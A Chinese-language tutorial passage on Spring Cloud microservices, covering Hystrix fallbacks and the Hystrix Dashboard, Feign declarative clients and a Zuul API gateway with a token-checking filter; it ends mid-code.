<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@HystrixCommand(fallbackMethod=&quot;error&quot;, commandProperties=&#123;</span></span><br><span class="line"><span class="meta">        @HystrixProperty(name=&quot;execution.isolation.thread.timeoutInMilliseconds&quot;, value=&quot;1500&quot;)&#125;)</span> <span class="comment">//熔断器，调用不通，回调error()方法</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">webHello</span> <span class="params">()</span> &#123;</span><br></pre></td></tr></table></figure>

<h2 id="6-4-Hystrix的服务降级"><a href="#6-4-Hystrix的服务降级" class="headerlink" title="6.4 Hystrix的服务降级"></a>6.4 Hystrix的服务降级</h2><p>有了服务的熔断，随之就会有服务的降级，所谓服务降级，就是当某个服务熔断之后，服务端提供的服务将不再被调用，此时由客户端自己准备一个本地的fallback回调，返回一个默认值来代表服务端的返回； </p>
<p>这种做法，虽然不能得到正确的返回结果，但至少保证了服务的可用，比直接抛出错误或服务不可用要好很多，当然这需要根据具体的业务场景来选择；</p>
<h2 id="6-5-Hystrix的异常处理"><a href="#6-5-Hystrix的异常处理" class="headerlink" title="6.5 Hystrix的异常处理"></a>6.5 Hystrix的异常处理</h2><p>我们在调用服务提供者时，我们自己也有可能会抛异常，默认情况下方法抛了异常会自动进行服务降级，交给服务降级中的方法去处理；</p>
<p>当我们自己发生异常后，只需要在服务降级方法中添加一个Throwable类型的参数就能够获取到抛出的异常的类型，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">error</span><span class="params">(Throwable throwable)</span> &#123;</span><br><span class="line">    System.out.println(throwable.getMessage());</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">此时我们可以在控制台看到异常的类型；</span><br><span class="line">如果远程服务有一个异常抛出后我们不希望进入到服务降级方法中去处理，而是直接将异常抛给用户，那么我们可以在<span class="meta">@HystrixCommand</span>注解中添加忽略异常，如下：</span><br><span class="line"><span class="meta">@HystrixCommand(fallbackMethod=&quot;error&quot;, ignoreExceptions = Exception.class)</span></span><br></pre></td></tr></table></figure>

<p><strong>自定义Hystrix请求的服务异常熔断处理</strong></p>
<p>我们也可以自定义类继承自HystrixCommand来实现自定义的Hystrix请求，在getFallback方法中调用getExecutionException方法来获取服务抛出的异常；</p>
<p>自定定义熔断器类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyHystrixCommand</span> <span class="keyword">extends</span> <span class="title class_">HystrixCommand</span>&lt;String&gt; &#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> String url</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">MyHystrixCommand</span> <span class="params">(Setter setter, RestTemplate restTemplate,String url)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">super</span>(setter);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.restTemplate = restTemplate;</span><br><span class="line"></span><br><span class="line">       <span class="built_in">this</span>.url=url;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> String <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> restTemplate.getForEntity(url, String.class).getBody();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   * 当远程服务超时、异常、不可用等情况时，会触发该熔断方法</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getFallback</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">Throwable</span> <span class="variable">throwable</span> <span class="operator">=</span> <span class="built_in">super</span>.getExecutionException();</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    System.out.println(throwable.getMessage());</span><br><span class="line"></span><br><span class="line">    System.out.println(throwable.getStackTrace());</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="comment">//实现服务熔断/降级逻辑</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">编写客户端请求方法</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test2&quot;)</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">test2</span> <span class="params">()</span> <span class="keyword">throws</span> ExecutionException, InterruptedException &#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="type">MyHystrixCommand</span> <span class="variable">myHystrixCommand</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyHystrixCommand</span>(com.netflix.hystrix.HystrixCommand.Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(<span class="string">&quot;&quot;</span>)), restTemplate);</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> myHystrixCommand.execute();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="6-6-Hystrix仪表盘监控"><a href="#6-6-Hystrix仪表盘监控" class="headerlink" title="6.6 Hystrix仪表盘监控"></a>6.6 Hystrix仪表盘监控</h2><p>Hystrix仪表盘（Hystrix Dashboard），就像汽车的仪表盘实时显示汽车的各项数据一样，Hystrix仪表盘主要用来监控Hystrix的实时运行状态，通过它我们可以看到Hystrix的各项指标信息，从而快速发现系统中存在的问题进而解决它。</p>
<p>要使用Hystrix仪表盘功能，我们首先需要有一个Hystrix Dashboard，这个功能我们可以在原来的消费者应用上添加，让原来的消费者应用具备Hystrix仪表盘功能，但一般地，微服务架构思想是推崇服务的拆分，Hystrix Dashboard也是一个服务，所以通常会单独创建一个新的工程专门用做Hystrix Dashboard服务；</p>
<p><strong>搭建一个Hystrix Dashboard服务的步骤：</strong></p>
<p><strong>第一步：</strong>创建一个普通的Spring Boot工程</p>
<p>比如创建一个名为springcloud-hystrix-dashboard的Spring Boot工程，建立好基本的结构和配置；</p>
<p><strong>第二步：</strong>添加相关依赖</p>
<p>在创建好的Spring Boot项目的 pom.xml文件中添加相关依赖，如下：</p>
<p>&lt;**dependency**&gt;<br>   &lt;**groupId**&gt;org.springframework.cloud&lt;&#x2F;**groupId**&gt;<br>   &lt;**artifactId**&gt;spring-cloud-starter-netflix-hystrix-dashboard&lt;&#x2F;**artifactId**&gt;<br> &lt;&#x2F;**dependency**&gt;</p>
<p><strong>第三步：</strong>入口类上添加注解</p>
<p>添加好依赖之后，在入口类上添加@EnableHystrixDashboard注解开启仪表盘功能，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableHystrixDashboard</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(Application.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>第四步：</strong>属性配置</p>
<p>最后，我们可以根据个人习惯配置一下application.properties文件，如下：</p>
<p>server.port&#x3D;3721</p>
<p>至此，我们的Hystrix监控环境就搭建好了；</p>
<p> <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212134880.png" alt="image-20201216220216809"></p>
<p>Hystrix仪表盘工程已经创建好了，现在我们需要有一个服务，让这个服务提供一个路径为&#x2F;actuator&#x2F;hystrix.stream接口，然后就可以使用Hystrix仪表盘来对该服务进行监控了；</p>
<p>我们改造消费者服务，让其能提供&#x2F;actuator&#x2F;hystrix.stream接口，步骤如下：</p>
<ol>
<li>消费者项目需要有hystrix的依赖：</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;!--Spring Cloud熔断器起步依赖--&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">   &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">   &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt;</span><br><span class="line"> &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>需要有一个spring boot的服务监控依赖：</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><p>配置文件需要配置spring boot监控端点的访问权限：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">management.endpoints.web.exposure.include</span><br><span class="line">  这个是用来暴露 endpoints 的，由于 endpoints 中会包含很多敏感信息，除了 health 和 info 两个支持直接访问外，其他的默认不能直接访问，所以我们让它都能访问，或者指定：</span><br><span class="line">management.endpoints.web.exposure.include=hystrix.stream</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>访问入口 <a href="http://localhost:8081/actuator/hystrix.stream">http://localhost:8081/actuator/hystrix.stream</a><br>注意：这里有一个细节需要注意，要访问&#x2F;hystrix.stream接口，首先得访问consumer工程中的任意一个其他接口，否则直接访问&#x2F;hystrix.stream接口时会输出出一连串的ping:  ping: …，先访问consumer中的任意一个其他接口，然后再访问&#x2F;hystrix.stream接口即可；</p>
</li>
</ol>
<h2 id="6-7-Hystrix仪表盘监控数据解读"><a href="#6-7-Hystrix仪表盘监控数据解读" class="headerlink" title="6.7 Hystrix仪表盘监控数据解读"></a>6.7 Hystrix仪表盘监控数据解读</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212134881.png" alt="image-20201216220921983"></p>
<h1 id="第七章-声明式服务消费Feign"><a href="#第七章-声明式服务消费Feign" class="headerlink" title="第七章 声明式服务消费Feign"></a>第七章 声明式服务消费Feign</h1><h2 id="7-1-Feign是什么"><a href="#7-1-Feign是什么" class="headerlink" title="7-1. Feign是什么"></a>7-1. Feign是什么</h2><p>Feign是Netflix公司开发的一个声明式的REST调用客户端；</p>
<p>Ribbon负载均衡、Hystrix服务熔断是我们Spring Cloud中进行微服务开发非常基础的组件，在使用的过程中我们也发现它们一般都是同时出现的，而且配置也都非常相似，每次开发都有很多相同的代码，因此Spring Cloud基于Netflix Feign整合了Ribbon和Hystrix两个组件，让我们的开发工作变得更加简单，就像Spring Boot是对Spring+SpringMVC的简化一样，Spring Cloud Feign对Ribbon负载均衡、Hystrix服务熔断进行简化，在其基础上进行了进一步的封装，不仅在配置上大大简化了开发工作，同时还提供了一种声明式的Web服务客户端定义方式；</p>
<h2 id="7-2-使用Feign实现消费者"><a href="#7-2-使用Feign实现消费者" class="headerlink" title="7.2 使用Feign实现消费者"></a>7.2 使用Feign实现消费者</h2><p>使用Feign实现消费者，我们通过下面步骤进行：</p>
<p><strong>第一步</strong>：创建普通Spring Boot工程</p>
<p>首先我们来创建一个普通的Spring Boot工程，取名为：</p>
<p>05-springcloud-service-feign；</p>
<p><strong>第二步</strong>：添加依赖</p>
<p>要添加的依赖主要是spring-cloud-starter-netflix-eureka-client和spring-cloud-starter-feign，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p><strong>第三步</strong>：添加注解</p>
<p>在项目入口类上添加@EnableFeignClients注解表示开启Spring Cloud Feign的支持功能；</p>
<p><strong>第四步</strong>：声明服务</p>
<p>定义一个HelloService接口，通过@FeignClient注解来指定服务名称，进而绑定服务，然后再通过SpringMVC中提供的注解来绑定服务提供者提供的接口，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//FeignClient设置当前的接口时一个Feign的声明式接口</span></span><br><span class="line"><span class="comment">//属性</span></span><br><span class="line"><span class="comment">// name 用于指定我们需要访问的服务提供者的服务名</span></span><br><span class="line"><span class="meta">@FeignClient(name = &quot;07-springcloud-eureka-client-feign-provider&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">TestService</span> &#123;</span><br><span class="line">    <span class="comment">//RequestMapping 这里用于只当我们需要访问的服务提供者的请求路径</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这相当于绑定了一个名叫07-springcloud-eureka-client-feign-provider (这里07-springcloud-eureka-client-feign-provider大小写07-SPRINGCLOUD-EUREKA-CLIENT-FEIGN-PROVIDER都可以 ) 的服务提供者提供的&#x2F;test接口；</p>
<p>我们服务提供者提供的接口如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Feign的服务提供者&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p><strong>第五步</strong>：使用Controller中调用服务</p>
<p>接着来创建一个Controller来调用上面的服务，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FeignController</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Autowired</span></span><br><span class="line"></span><br><span class="line">  HelloService helloService;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@RequestMapping(&quot;/web/hello&quot;)</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> helloService.hello();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p><strong>第六步</strong>：属性配置</p>
<p>在application.properties中指定服务注册中心、端口号等信息，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#指定服务的名称 即使是服务的消费者也会将自己注册到注册中心</span><br><span class="line">spring.application.name=<span class="number">07</span>-springcloud-eureka-client-feign-consumer</span><br><span class="line">#指定Eureka注册中的访问地址</span><br><span class="line">eureka.client.service-url.defaultZone=http:<span class="comment">//localhost:9100/eureka</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p><strong>第七步</strong>：测试</p>
<p>依次启动注册中心、服务提供者和feign实现服务消费者，然后访问如下地址：<a href="http://localhost:8080/test">http://localhost:8080/test</a></p>
<h2 id="7-3-使用Feign实现消费者的测试"><a href="#7-3-使用Feign实现消费者的测试" class="headerlink" title="7.3 使用Feign实现消费者的测试"></a>7.3 使用Feign实现消费者的测试</h2><p><strong>负载均衡：</strong></p>
<p>我们知道，Spring Cloud 提供了Ribbon来实现负载均衡，使用Ribbo直接注入一个RestTemplate对象即可，RestTemplate已经做好了负载均衡的配置；</p>
<p>在Spring Cloud下，使用Feign也是直接可以实现负载均衡的，定义一个注解有@FeignClient注解的接口，然后使用@RequestMapping注解到方法上映射远程的REST服务，此方法也是做好负责均衡配置的。</p>
<p><strong>服务熔断：</strong></p>
<ol>
<li><p>在application.properties文件开启feign对hystrix功能支持（支持熔断）</p>
<p>feign.hystrix.enabled&#x3D;true</p>
</li>
<li><p>指定熔断回调逻辑</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//自定义熔断器类，这个类需要实现生命式服务消费接口</span></span><br><span class="line"><span class="comment">//并实现这个接口中所有的方法，为这个接口提供熔断的响应方法</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyFallBack</span> <span class="keyword">implements</span> <span class="title class_">TestService</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;test请求不可用请稍后再试&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test2</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;test2请求不可用请稍后再试-------&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;	</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><p>服务熔断获取异常信息：<br>为@FeignClient修饰的接口加上fallback方法可以实现远程服务发生异常后进行服务的熔断，但是不能获取到远程服务的异常信息，如果要获取远程服务的异常信息，怎么办？此时可以使用fallbackFactory:<br>样例代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@FeignClient(name=&quot;01-springcloud-service-provider&quot;, fallbackFactory= MyFallbackFactory.class)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyFallbackFactory</span> <span class="keyword">implements</span> <span class="title class_">FallbackFactory</span>&lt;HelloService&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> HelloService <span class="title function_">create</span><span class="params">(Throwable throwable)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">HelloService</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> throwable.getMessage();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="第八章-API网关Zuul"><a href="#第八章-API网关Zuul" class="headerlink" title="第八章 API网关Zuul"></a>第八章 API网关Zuul</h1><h2 id="8-1-Spring-Cloud的Zuul是什么"><a href="#8-1-Spring-Cloud的Zuul是什么" class="headerlink" title="8.1 Spring Cloud的Zuul是什么"></a>8.1 Spring Cloud的Zuul是什么</h2><p>通过前面内容的学习，我们已经可以基本搭建出一套简略版的微服务架构了，我们有注册中心Eureka，可以将服务注册到该注册中心中，我们有Ribbon或Feign可以实现对服务负载均衡地调用，我们有Hystrix可以实现服务的熔断，但是我们还缺少什么呢？</p>
<p>我们首先来看一个微服务架构图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212134882.png" alt="image-20201216223910109"></p>
<p>  在上面的架构图中，我们的服务包括：内部服务Service A和内部服务Service B，这两个服务都是集群部署，每个服务部署了3个实例，他们都会通过Eureka Server注册中心注册与订阅服务，而Open Service是一个对外的服务，也是集群部署，外部调用方通过负载均衡设备调用Open Service服务，比如负载均衡使用Nginx，这样的实现是否合理，或者是否有更好的实现方式呢？接下来我们主要围绕该问题展开讨论。</p>
<ol>
<li><p>如果我们的微服务中有很多个独立服务都要对外提供服务，那么我们要如何去管理这些接口？特别是当项目非常庞大的情况下要如何管理？</p>
</li>
<li><p>在微服务中，一个独立的系统被拆分成了很多个独立的服务，为了确保安全，权限管理也是一个不可回避的问题，如果在每一个服务上都添加上相同的权限验证代码来确保系统不被非法访问，那么工作量也就太大了，而且维护也非常不方便。</p>
</li>
</ol>
<p>为了解决上述问题，微服务架构中提出了API网关的概念，它就像一个安检站一样，所有外部的请求都需要经过它的调度与过滤，然后API网关来实现请求路由、负载均衡、权限验证等功能；</p>
<p>那么Spring Cloud这个一站式的微服务开发框架基于Netflix Zuul实现了Spring Cloud Zuul，采用Spring Cloud Zuul即可实现一套API网关服务。</p>
<h2 id="8-2-使用Zuul构建API网关"><a href="#8-2-使用Zuul构建API网关" class="headerlink" title="8.2 使用Zuul构建API网关"></a>8.2 使用Zuul构建API网关</h2><ol>
<li>创建一个普通的Spring Boot工程名为06-springcloud-api-gateway，然后添加相关依赖，这里我们主要添加两个依赖zuul和eureka依赖：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--添加spring cloud的zuul的起步依赖--&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-starter-netflix-zuul&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;!--添加spring cloud的eureka的客户端依赖--&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>在入口类上添加@EnableZuulProxy注解，开启Zuul的API网关服务功能：</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableZuulProxy</span> <span class="comment">//开启Zuul的API网关服务功能</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(Application.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><p>在application.properties文件中配置路由规则：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#配置服务内嵌的Tomcat端口</span><br><span class="line">server.port=<span class="number">8083</span></span><br><span class="line">#配置服务的名称</span><br><span class="line">spring.application.name=08-springcloud-eureka-client-zuul</span><br><span class="line">#配置路由规则zuul.routes.api-zuul.path  中api-zuul 可以任意填写</span><br><span class="line">#/api-zuul<span class="comment">/** 表示请求的拦截规则类似拦截器的拦截规则以/api-zuul开头的任意目录以及子孙目录中所有请求都会被拦截</span></span><br><span class="line"><span class="comment">zuul.routes.api-zuul.path=/api-zuul/**</span></span><br><span class="line"><span class="comment">#指向服务名字 用于对这个服务下的某个写特定请求进行拦截</span></span><br><span class="line"><span class="comment">zuul.routes.api-zuul.serviceId=08-springcloud-eureka-client-zuul-consumer</span></span><br><span class="line"><span class="comment">#配置API网关到注册中心上，API网关也将作为一个服务注册到eureka-server上</span></span><br><span class="line"><span class="comment">eureka.client.service-url.defaultZone=http://localhost:9100/eureka</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>以上配置，我们的路由规则就是匹配所有符合&#x2F;api-zuul&#x2F;**的请求，只要路径中带有&#x2F;api- zuul &#x2F;都将被转发到08-springcloud-eureka-client-zuul-consumer服务上，至于08-springcloud-eureka-client-zuul-consumer服务的地址到底是什么则由eureka-server注册中心去分析，我们只需要写上服务名即可。<br>以我们目前搭建的项目为例，请求 <a href="http://localhost:8080/api-zuul/test">http://localhost:8080/api-zuul/test</a> 接口则相当于请求 <a href="http://localhost:8080/test">http://localhost:8080/test</a><br>(08-springcloud-eureka-client-zuul-consumer 服务的地址为 <a href="http://localhost:8080/test)%EF%BC%8C">http://localhost:8080/test)，</a><br>路由规则中配置的api-zuul是路由的名字，可以任意定义，但是一组path和serviceId映射关系的路由名要相同。</p>
<p>如果以上测试成功，则表示们的API网关服务已经构建成功了，我们发送的符合路由规则的请求将自动被转发到相应的服务上去处理。</p>
<h2 id="8-3-使用Zuul进行请求过滤"><a href="#8-3-使用Zuul进行请求过滤" class="headerlink" title="8.3 使用Zuul进行请求过滤"></a>8.3 使用Zuul进行请求过滤</h2><p>我们知道Spring cloud Zuul就像一个安检站，所有请求都会经过这个安检站，所以我们可以在该安检站内实现对请求的过滤，下面我们以一个权限验证案例说这一点：</p>
<p>1、我们定义一个过滤器类并继承自ZuulFilter，并将该Filter作为一个Bean：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//自定义一个过滤器类用于拦截用户的请求 并继承Zuul提供的过滤器类</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AuthFilter</span> <span class="keyword">extends</span> <span class="title class_">ZuulFilter</span> &#123;</span><br><span class="line">    <span class="comment">//过滤器类型 决定式在请求之前还是请求之后指定当前过滤器</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">filterType</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//返回pre表示要在请求之前执行过滤器</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;pre&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//过滤器的排序，如果有多个过滤器那么这些过滤器将按照返回值大小直接排序执行</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">filterOrder</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//是否启动当前过滤器如果返回true表示将要执行这个过滤器，如果返回false表示不执行这个过滤器</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldFilter</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//如果进入当前过滤后，这个方法就是过滤器中具体的业务逻辑</span></span><br><span class="line">    <span class="comment">//注意：这个返回值目前版本没有什么特殊作用 因此返回 null即可</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> ZuulException &#123;</span><br><span class="line">        <span class="comment">//获取当前请求的上下文对象</span></span><br><span class="line">        RequestContext  requestContext=RequestContext.getCurrentContext();</span><br><span class="line">        <span class="comment">//获取当前请求对象</span></span><br><span class="line">        HttpServletRequest request=requestContext.getRequest();</span><br><span class="line">        <span class="comment">//获取请求参数中的token数据（用户的身份令牌）</span></span><br><span class="line">        String token=request.getParameter(<span class="string">&quot;token&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(token==<span class="literal">null</span>)&#123;<span class="comment">//进入if表示当前请求中没有携带token我们任务当前请求是非法请求</span></span><br><span class="line">            <span class="comment">//通知ZuulAPI网关当前请求非法</span></span><br><span class="line">            requestContext.setSendZuulResponse(<span class="literal">false</span>);</span><br><span class="line">            <span class="comment">//设置响应编码为401 表示权限不足</span></span><br><span class="line">            requestContext.setResponseStatusCode(<span class="number">401</span>);</span><br><span class="line">            <span 